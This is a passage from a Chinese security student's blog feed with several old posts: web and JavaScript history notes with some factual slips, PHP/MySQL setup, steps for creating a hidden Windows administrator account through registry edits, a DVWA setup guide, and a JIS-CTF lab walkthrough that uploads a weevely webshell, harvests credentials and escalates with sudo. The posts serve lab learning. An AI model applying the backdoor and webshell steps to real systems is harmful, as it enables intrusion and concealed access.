    <content type="html"><![CDATA[<p>pte培训7天的笔记整合。</p><span id="more"></span><p><a href="/2020/10/25/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday1/index.html">Day1</a></p><p>phpMyAdmin、apache tomcat 8.5.19、DoraBox、pikachu</p><p><a href="/2020/10/26/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday2/index.html">Day2</a></p><p>doraBOX</p><p><a href="/2020/10/30/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday3/index.html">Day3</a></p><p>sqli-labs、BUUCTF…</p><p><a href="/2020/11/03/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday4/index.html">Day4</a></p><p>xss、文件上传</p><p><a href="/2020/11/15/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday5/index.html">Day5</a></p><p>真题</p><p><a href="/2020/11/17/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday6/index.html">Day6</a></p><p>练习题</p><p><a href="/2020/12/05/old/%E5%9F%B9%E8%AE%AD/%E5%9F%B9%E8%AE%ADday7/index.html">Day7</a></p><p>代码审计、文件包含</p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一些web历史</title>
    <link href="/2020/03/19/old/%E4%B8%80%E4%BA%9B%E5%8E%86%E5%8F%B2/"/>
    <url>/2020/03/19/old/%E4%B8%80%E4%BA%9B%E5%8E%86%E5%8F%B2/</url>
    
    <content type="html"><![CDATA[<p>觉得历史还是挺有意思的，虽说不是什么技术，但也有帮助去理解一些东西吧。</p><h1 id="web发展史"><a href="#web发展史" class="headerlink" title="web发展史"></a>web发展史</h1><p>世界上出现最早的浏览器叫<strong>www</strong>（worldwideweb）。</p><p>但<strong>mosaic</strong>是第一个互联网上<strong>普遍使用</strong>并且能够<strong>显示图片</strong>的网页浏览器。</p><p>1993年4月，马克·安德森和其团队研究出了mosaic。后因和伊利诺伊大学的版权纠纷，而做出了比前者更强的浏览器Netscape navigator（网景浏览器，又称为导航者）。</p><p>2003年，网景解散并开放源码。Mozilla公司基于源码开发了<strong>Mozilla Firebird</strong>。</p><!--more--><p>到2004年，改名为火狐<strong>firefox</strong>。</p><p>而拿到mosaic版权的伊利诺伊大学，把技术转让给了spyclass Entertainment公司。</p><p>1996年，微软收购spyclass的技术（基于mosaic原型）并开发了<strong>internet explorer</strong>浏览器。</p><h1 id="js历史"><a href="#js历史" class="headerlink" title="js历史"></a>js历史</h1><p>1996年，网景的<strong>布兰登·艾克</strong>花费了23天创造js，Javascript最先作为Netscape navigator的一部分。它最初的设计目标是改善网页的用户体验（能够动态的改变控制网页逻辑）。</p><p>最早js被布兰登·艾克命名为Mocal，后改名livescript，后又因为和sun公司（Oak语言的开发者，后改名为java）合作而改名为JavaScript。</p><p>后来sun公司被Oracle收购，JavaScript版权归Oracle所有。</p><h1 id="浏览器的组成"><a href="#浏览器的组成" class="headerlink" title="浏览器的组成"></a>浏览器的组成</h1><p>浏览器分为两大部分：<strong>shell</strong>（外核）和<strong>内核</strong></p><p>外核是浏览器上用户能操作的部分。</p><p>内核是用户看不到的，能够处理代码并显示代码。</p><p><strong>内核主要分为</strong>：</p><ol><li>渲染引擎（语法规则和渲染）：html、css基础语法的识别及绘制页面【ps：浏览器的页面绘制是一层一层的】</li><li>js引擎（负责JavaScript）</li><li>其他模块</li></ol><h1 id="JS引擎"><a href="#JS引擎" class="headerlink" title="JS引擎"></a>JS引擎</h1><p>1996年JavaScript诞生之初还没有引擎，还依赖于渲染引擎。</p><p>但由于当时技术不高，超过20行JavaScript代码，页面就无法运行了。</p><p>直到2001年发布的ie6，从内核中剥离了一个js引擎专门处理JavaScript代码，它可以处理万行以上的JavaScript代码。</p><p>2008年google联合apple开发了浏览器chrome。chrome使用的内核为Webkit，webkit使用的引擎为V8，能把js代码直接转化为机械码来执行，进而以速度快而闻名（直到现在Chrome的渲染速度依然很快）。</p><p>后来Firefox也推出了强大的js引擎，Firefox3.5的tracemonkey（对频繁执行的代码做了路径优化），Firefox4.0的legalmonkey。</p><h1 id="JavaScript的特色"><a href="#JavaScript的特色" class="headerlink" title="JavaScript的特色"></a>JavaScript的特色</h1><h3 id="1-它是解释性语言"><a href="#1-它是解释性语言" class="headerlink" title="1.它是解释性语言"></a>1.它是解释性语言</h3><p>机器无法直接看懂我们的语言，需要通过翻译让其识别。</p><p>有两种翻译过程，编译和解释。</p><p>所以语言也分为<strong>编译型语言</strong>和<strong>解释型语言</strong>。</p><p>编译型语言是通篇翻译，并生成一个翻译完的文件，最后程序会执行这个文件（例如c，c++）。</p><ul><li><p>优点：快（可以开发系统底层的东西）</p></li><li><p>不足：移植性不好（不跨平台）</p></li></ul><p>解释型语言是读一行翻译一行执行一句，不生成特定文件（例如JavaScript，php，python）。</p><ul><li><p>优点：跨平台</p></li><li><p>不足：较慢</p></li></ul><p>java比较特殊，既不属于编译型也不属于解释型。</p><p>java文件通过javac编译成.class文件，通过jym虚拟机解释执行。因为jym虚拟机的存在，java可以跨平台运行。</p><p>过程：.java – javac –&gt; 编译 –&gt; .class –&gt; jym –解释执行</p><h3 id="2-单线程"><a href="#2-单线程" class="headerlink" title="2.单线程"></a>2.单线程</h3><p>单线程：同一时间只能干一件事（同步）。</p><p>多线程：同一时间干多件事（异步）。</p><p>准确的说应该是js引擎为单线程。</p><h3 id="3-ECMA标准"><a href="#3-ECMA标准" class="headerlink" title="3.ECMA标准"></a>3.ECMA标准</h3><p>为了取得技术优势，微软推出了Jscript，CEnvi退出ScriptEase，与JavaScript都可在浏览器上运行。</p><p>为了统一规格，JavaScript兼容于ECMA标准（ECMA:全名欧洲计算机制造商协会，1961年成立旨在建立统一电脑操作系统格式标准的组织），因此也称之为ECMAScript。</p><p>由于标准的指定，也使得JavaScript成为了最终的“一家独大”。</p><p>后来的JavaScript比起ECMAScript的功能更加强大。</p><p>现在JavaScript的基本组成是<strong>ECMAScript</strong>，<strong>dom</strong>，<strong>bom</strong>。</p><p>ECMAScript(简称cs)：描述该语言的语法和基本对象</p><p>DOM：操作文档</p><p>BOM：操作浏览器</p><h1 id="js执行队列"><a href="#js执行队列" class="headerlink" title="js执行队列"></a>js执行队列</h1><p>由于js是单线程，并不能同时进行多项任务</p><p>所以js会把每一个任务按照一定的毫秒分成多个片段，将片段按照随机顺序排成队列，往js主线程送。</p><p>这个过程也叫做轮转时间片。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这是基于姬成老师的js课程所做的笔记，在笔记基础上也百度了解了一些东西。</p><p>除了技术，素养也同样重要。</p><p>接下来也要不断的努力提升自己。</p><p>以上。</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>历史</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP环境搭建(apache+php+mysql)</title>
    <link href="/2020/03/14/old/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2020/03/14/old/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>因为这学期要学习web后端了，所以搭建一下php环境。</p><p>环境：虚拟机windowserver2016</p><p><strong>apache2.4+php7+mysql8.0</strong></p><h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><p>去 <a href="https://www.apachelounge.com/download/">https://www.apachelounge.com/download/</a>  上根据自己的系统来下载apache文件。</p><p>（我这里是64位，所以下载了apache 2.4.41 win64）</p><span id="more"></span><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584061621280.png" alt="1584061621280"></p><p>把下载好的压缩包拖进虚拟机，解压。</p><p>在虚拟机新建web&#x2F;apache2.4文件夹，把刚刚解压文件里的<strong>apache24</strong>文件夹里的所有文件拖到apache2.4里。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584061841300.png" alt="1584061841300"></p><p>打开conf个文件下的httpd.conf。</p><p>首先<strong>配置apache安装目录</strong>，查找字符c:&#x2F;apache24并替换成刚刚创建的目录。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584063068601.png" alt="1584063068601"></p><p>接着<strong>配置服务器域名</strong>，查找字符ServerName，找到<code>ServerName www.example.com:80</code>并将该行的注释符删除。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584063282821.png" alt="1584063282821"></p><p>接着开始<strong>安装apache</strong>。</p><p>使用命令行窗口（注：需要用管理员身份运行），将目录切换到apache2.4&#x2F;bin。</p><p>输入<code>httpd.exe -k install</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584097626928.png" alt="1584097626928"></p><p>安装成功！</p><p>启动，运行**&#x2F;web&#x2F;apache2.4&#x2F;bin<strong>下的</strong>ApacheMonitor**。</p><p>右下角会出现一个图标，点击start。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584098327516.png" alt="1584098327516"></p><p><strong>验证是否安装完成</strong>：打开浏览器，输入localhost，出现It works！就表示安装成功。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584098423941.png" alt="1584098423941"></p><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><p>下载文件：<a href="https://www.php.net/downloads">https://www.php.net/downloads</a></p><p>在web文件夹下新建php文件夹，把下载解压好多文件放进去。</p><p>复制一份php.ini-development文件，并改名为php.ini。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584098639944.png" alt="1584098639944"></p><p>打开php.ini进行修改。</p><p><strong>配置php扩展目录</strong>：找到extension_dir &#x3D; “ext”，将其注释符;去掉，并在ext前添加现在的路径。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584098826862.png" alt="1584098826862"></p><p><strong>将时区修改为中国时区</strong>：修改;date.timezone &#x3D;为date.timezone &#x3D; PRC</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584099007657.png" alt="1584099007657"></p><p><strong>让apache引入php模块</strong>：打开apache2.4&#x2F;conf下的httpd.conf，</p><p>添加以下代码（需根据实际情况更改）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">LoadModule</span> php7_module <span class="hljs-string">&quot;c:/web/php/php7apache2_4.dll&quot;</span><br><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;\.php$&quot;</span>&gt;</span><br>    <span class="hljs-attribute">setHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br><span class="hljs-attribute">PHPIniDir</span> <span class="hljs-string">&quot;c:/web/php&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584099506675.png" alt="1584099506675"></p><p><strong>设置默认索引页</strong>：在httpd.conf查找Directoryindex，添加一个index.php文件。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584099745670.png" alt="1584099745670"></p><p>重启apache（如果不报错就没有问题）</p><p><strong>测试是否能正常解析</strong>：在apache2.4&#x2F;htdocs下新建一个php文件<strong>test.php</strong>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用浏览器访问localhost&#x2F;test.php。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584101675373.png" alt="1584101675373"></p><h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><p>下载文件：<a href="https://dev.mysql.com/downloads/mysql/">https://dev.mysql.com/downloads/mysql/</a></p><p>在web文件夹下新建mysql文件夹。</p><p><strong>如果用安装包：</strong>把下载好的mysql安装在里面即可，没什么好说的。</p><p><strong>如果用的是免安装包：</strong></p><h3 id="（1）配置文件"><a href="#（1）配置文件" class="headerlink" title="（1）配置文件"></a>（1）配置文件</h3><p>先把文件好的文件移动到新建的mysql文件夹。</p><p>新建空文件<strong>mysqlData</strong>作为mysql数据库的存放目录</p><p>新建my.ini文件。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span> <br><span class="hljs-comment">#设置3306端口 </span><br><span class="hljs-attr">port</span> = <span class="hljs-number">3306</span><br><span class="hljs-comment"># 设置mysql的安装目录 </span><br><span class="hljs-attr">basedir</span>=c:\web\mysql8.<span class="hljs-number">0</span><br><span class="hljs-comment"># 设置mysql数据库的数据的存放目录</span><br><span class="hljs-attr">datadir</span>=c:\web\mysqlData<br><span class="hljs-comment"># 允许最大连接数</span><br><span class="hljs-attr">max_connections</span>=<span class="hljs-number">200</span> <br><span class="hljs-comment"># 服务端使用的字符集默认为8比特编码的latin1字符集</span><br><span class="hljs-attr">character-set-server</span>=utf8 <br><span class="hljs-comment"># 创建新表时将使用的默认存储引擎 </span><br><span class="hljs-attr">default-storage-engine</span>=INNODB<br><span class="hljs-comment"># 默认使用“mysql_native_password”插件认证</span><br><span class="hljs-comment">#mysql_native_password</span><br><span class="hljs-attr">default_authentication_plugin</span>=mysql_native_password<br><span class="hljs-section">[mysql]</span><br><span class="hljs-comment"># 设置mysql客户端默认字符集</span><br><span class="hljs-attr">default-character-set</span>=utf8<br><span class="hljs-section">[client]</span><br><span class="hljs-comment"># 设置mysql客户端连接服务端时默认使用的端口</span><br><span class="hljs-attr">port</span>=<span class="hljs-number">3306</span><br><span class="hljs-attr">default-character-set</span>=utf8<br></code></pre></td></tr></table></figure><p>mysql的安装目录及数据库存放目录根据实际情况修改。</p><h3 id="（2）环境变量"><a href="#（2）环境变量" class="headerlink" title="（2）环境变量"></a>（2）环境变量</h3><p>我的电脑&gt;属性&gt;高级系统设置&gt;高级&gt;环境变量&gt;系统变量&gt;path。</p><p>添加mysql的bin目录</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584103211611.png" alt="1584103211611"></p><h3 id="（3）初始化数据库-安装mysql服务-修改密码"><a href="#（3）初始化数据库-安装mysql服务-修改密码" class="headerlink" title="（3）初始化数据库+安装mysql服务+修改密码"></a>（3）初始化数据库+安装mysql服务+修改密码</h3><p>使用管理员身份打开命令行窗口。</p><p>移动到mysql\bin目录下，输入<code>mysqld --initialize --console</code></p><p><img src="C:\Users\lenovo\Pictures\截图\新建文件夹\screenshot.221.jpg" alt="screenshot.221"></p><p>保存localhost后的这一串，后面会做初始密码用。</p><p>安装mysql服务：<code>mysql install mysql8</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584103932626.png" alt="1584103932626"></p><p>开启服务：<code>net start Mysql8</code></p><p>登录：<code>mysql -u root -p</code></p><p>密码就是刚刚的初始密码。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584104416746.png" alt="1584104416746"></p><p>修改密码：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">WITH</span> mysql_native_password <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;新密码&#x27;</span>;<br></code></pre></td></tr></table></figure><p>完成！！！</p><h1 id="可能出现的问题"><a href="#可能出现的问题" class="headerlink" title="可能出现的问题"></a>可能出现的问题</h1><h3 id="（1）apache安装时报错缺失文件"><a href="#（1）apache安装时报错缺失文件" class="headerlink" title="（1）apache安装时报错缺失文件"></a>（1）apache安装时报错缺失文件</h3><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584063732226.png" alt="1584063732226"></p><p>这事由于缺少了apache所需的运行库，下载安装相应的vc即可。</p><h3 id="（2）配置php模块后，apache无法启动"><a href="#（2）配置php模块后，apache无法启动" class="headerlink" title="（2）配置php模块后，apache无法启动"></a>（2）配置php模块后，apache无法启动</h3><p>可以先使用httpd.exe -w -n “Apache2.4”  -k start命令排错。</p><p>如果没有错误，就是缺少vc15的库。</p><p>老老实实安装吧。</p><p>参考：（mysql安装）<a href="https://www.jb51.net/article/173332.html">https://www.jb51.net/article/173332.html</a></p>]]></content>
    
    
    <categories>
      
      <category>杂</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>环境搭建</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>建立隐藏管理员账户（图形化界面）</title>
    <link href="/2020/03/06/old/%E5%BB%BA%E7%AB%8B%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%EF%BC%88%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2%EF%BC%89/"/>
    <url>/2020/03/06/old/%E5%BB%BA%E7%AB%8B%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%EF%BC%88%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>正好作业布置了这个，就顺带来写一篇吧。</p><p>实验环境：<strong>winserver2016</strong></p><p>先新建一个账户abc。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583482741786.png" alt="1583482741786"></p><!-- more --><p>打开注册表（win+R，输入regedit），找到HKEY_LOCAL_MACHINE&gt;SAM&gt;SAM，右键赋予权限。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583483015022.png" alt="1583483015022"></p><p>F5刷新，之后可以看见SAM文件夹出现了子项，选择SAM&gt;Account&gt;Users&gt;Names，选中abc。</p><p>可以看见一个类型写着0x3eb的文件，0x是十六进制的标识。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583483099170.png" alt="1583483099170"></p><p>现在到users文件夹下，选中末尾为<strong>3eb</strong>及name里的<strong>abc</strong>这两个文件，右键导出。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583483672420.png" alt="1583483672420"></p><p>回到计算机管理器，把abc用户删除。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583483756032.png" alt="1583483756032"></p><p>现在返回注册表，刷新一下，发现abc的相关文件不见了。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583483861802.png" alt="1583483861802"></p><p>这时候再运行刚刚导出的文件，users里会重新出现刚刚的文件，但【本地用户与组】里的abc都不会重新出现。</p><p>将本地安全策略中的【交互式登录：不显示最后的用户名】属性<strong>开启</strong>。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583485527252.png" alt="1583485527252"></p><p>注销或者重启，尝试输入用户名和密码登录。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583486280391.png" alt="1583486280391"></p><p>登录成功！</p><p>参考：<a href="https://blog.51cto.com/yttitan/1334643">https://blog.51cto.com/yttitan/1334643</a></p>]]></content>
    
    
    <categories>
      
      <category>杂</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dvwa简介+搭建</title>
    <link href="/2019/12/16/old/dvwa1/"/>
    <url>/2019/12/16/old/dvwa1/</url>
    
    <content type="html"><![CDATA[<p>DVWA简介+搭建</p><p><strong>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP&#x2F;MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</strong></p><span id="more"></span><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a><strong>搭建</strong></h2><p><strong>xp镜像+<a href="https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/1.8.2/xampp-win32-1.8.2-6-VC9-installer.exe/download">xampp</a>+<a href="http://www.dvwa.co.uk/">dvwa</a></strong></p><p>1.在xp里安装xampp，开启apache和mysql服务。</p><p>2.把下载好的dvwa解压，改名为dvwa，放在xampp的htdocs目录下（可以先把htdocs目录下的文件移到其他地方）。</p><p>3.进入：<a href="http://127.0.0.1/dvwa/login.php">http://127.0.0.1/dvwa/login.php</a></p><p>(ps：如果报错显示<strong>DVWA System error - config file not found. Copy config&#x2F;config.inc.php.dist ……</strong></p><p>到\dvwa\config目录下把config.inc.php.dist改为config.inc.php即可)</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/dvwa/dvwa%EF%BC%88%E4%B8%80%EF%BC%89/screenshot.1.jpg"></p><p>4.到config目录下，打开config.inc.php文件，移除db_password的值</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/dvwa/dvwa%EF%BC%88%E4%B8%80%EF%BC%89/screenshot.2.jpg"></p><p>5.页面往下拉，选择create&#x2F;reset database</p><p>6.刷新（或者点击下面的按钮login），会显示一个登录页面</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/dvwa/dvwa%EF%BC%88%E4%B8%80%EF%BC%89/screenshot.3.jpg"></p><p>7.使用admin&#x2F;password登录。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/dvwa/dvwa%EF%BC%88%E4%B8%80%EF%BC%89/screenshot.4.jpg"></p><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>分为是个模块，分别是：</p><p>1.Brute Force（暴力破解）</p><p>2.Command Injection（命令行注入）</p><p>3.CSRF（跨站请求伪造）</p><p>4.File Inclusion（文件包含）</p><p>5.File Upload（文件上传）</p><p>6.Insecure CAPTCHA（不安全验证码）</p><p>7.SQL Injection（sql注入）</p><p>8.SQL Injection(blind) （sql盲注）</p><p>9.XSS(Reflected) （反射型跨站脚本）</p><p>10.XSS(Stored)（储存型跨站脚本）</p><p>有四种安全级别：low，medium，high，impossible</p><p>参考：<a href="https://www.freebuf.com/articles/web/116437.html">https://www.freebuf.com/articles/web/116437.html</a></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>dvwa</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JIS-CTF靶机渗透</title>
    <link href="/2019/12/15/old/JIS-CTF%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <url>/2019/12/15/old/JIS-CTF%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h1><p>攻击机：kali</p><p>靶机：JIS-CTF </p><p>网络：nat模式，192.168.110.0&#x2F;24网段</p><h1 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h1><h2 id="1）拿flag"><a href="#1）拿flag" class="headerlink" title="1）拿flag"></a>1）拿flag</h2><p>首先要找到靶机。</p><p>先使用nmap扫描。</p><span id="more"></span><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.6.jpg"></p><p>发现了靶机，ip为134，开放了22和80端口。</p><p>所以尝试使用浏览器访问80端口，进入了一个登录页面。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.7.jpg"></p><p>查看源码没有什么发现，弱密码也无法进入。</p><p>尝试用dirb扫描目录。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.8.jpg"></p><p>扫描出了一个flag，进入查看。</p><p>拿到<strong>第一个flag</strong>。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.9.jpg"></p><p>接着进入其他扫描出来的目录查看。</p><p>看到admin_area的页面，感觉有点东西。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.10.jpg"></p><p>查看源码，发现<strong>第二个flag</strong>和用户名密码。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.11.jpg"></p><p>使用刚刚拿到的用户名密码登录，发现是一个文件上传页面，并且对上传的文件没有限制。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.12.jpg"></p><p>使用kali自带的weevely，生成一个马上传。</p><p>weevely generate <password>  <path></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.16.jpg"></p><p>上传了木马后，就要查找木马上传到的目录。</p><p>进入robots.txt</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.13.jpg"></p><p>这里面列了不允许进入的目录。</p><p>里面有uploads和uploaded_files，尝试都访问一下。</p><p>发现在uploaded_files下（没有报错）。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.17.jpg"></p><p>发现木马的位置。</p><p>使用<strong>weevely</strong>连接。</p><p>【格式：weevely &lt;路径&gt; &lt;密码&gt;】</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.18.jpg"></p><p>进入网页根路径，发现flag.txt。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.19.jpg"></p><p>尝试查看，发现没有权限。这时候试着查看<strong>hint(暗示).txt</strong>。</p><p>找到<strong>第三个flag</strong>和一串信息，写着：尝试去寻找techenawi用户的密码来阅读flag.txt，你可以在一个隐藏文件里找到它（笑）。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.20.jpg"></p><p>使用grep查询technawi（-r：递归， -n：显示匹配行及行号，-s： 不显示不存在或无匹配文本的错误信息）</p><p>发现**&#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;credentials.txt**包含这个字符串。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.21.jpg"></p><p>查看这个文件，里面包含第<strong>四个flag</strong>和用户名密码。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.22.jpg"></p><p>前面扫描的时候，发现该靶机有ssh服务。</p><p>尝试使用该用户名密码ssh登录，访问之前没有权限访问的flag.txt，得到<strong>第五个flag</strong>。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.23.jpg"></p><p>成功拿到了全部的flag！</p><h2 id="2）提权"><a href="#2）提权" class="headerlink" title="2）提权"></a>2）提权</h2><p>最后尝试提权。</p><p>查看history，发现technawi用户可以使用sudo。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.24.jpg"></p><p>使用sudo -l查看sudo的权限，发现是all。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.25.jpg"></p><p>尝试sudo提权。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.26.jpg"></p><p>提权成功！</p><h1 id="出现的问题以及解决方案"><a href="#出现的问题以及解决方案" class="headerlink" title="出现的问题以及解决方案"></a>出现的问题以及解决方案</h1><h2 